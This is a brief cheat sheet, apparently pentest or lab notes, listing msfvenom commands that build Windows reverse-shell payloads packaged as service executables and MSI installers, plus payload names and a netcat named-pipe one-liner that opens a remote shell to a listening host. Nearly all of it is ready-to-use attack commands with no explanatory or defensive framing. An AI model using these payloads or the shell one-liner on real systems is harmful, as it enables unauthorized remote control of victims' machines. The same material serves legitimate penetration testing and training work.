### Windows Reverse Shells
```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.157.28 LPORT=4444 -o gingerlyservice.exe
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.239.36 LPORT=9000 -a x64 --platform Windows -f msi -o rev.msi
```

```shell
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

`linux/x86/shell_reverse_tcp`

Windows 32 Bit Targets

`windows/shell_reverse_tcp`

### Named Pipes

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`